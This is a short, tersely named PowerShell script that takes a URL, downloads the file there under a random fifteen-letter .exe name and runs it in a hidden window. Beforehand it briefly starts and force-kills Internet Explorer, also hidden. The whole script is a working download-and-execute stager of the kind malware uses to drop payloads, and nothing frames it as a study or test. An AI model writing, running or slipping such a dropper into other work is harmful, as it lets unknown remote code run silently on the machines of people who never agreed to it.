param(
[Parameter(Mandatory=$True, Position=0, ValueFromPipeline=$false)]
[System.String]
$p
)

$f=-join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})+".exe"

function o {
param($u)
$i = New-Object System.Diagnostics.ProcessStartInfo
$n = New-Object System.Diagnostics.Process
$i.FileName = $u
$i.CreateNoWindow = $true
$i.WindowStyle = "Hidden"
$n.StartInfo = $i
$n.Start()
}

o("iexplore.exe")
Start-Sleep -Seconds 2.5
taskkill /f /im iexplore*
(New-Object System.Net.WebClient).DownloadFile($p,$f)
o($f)
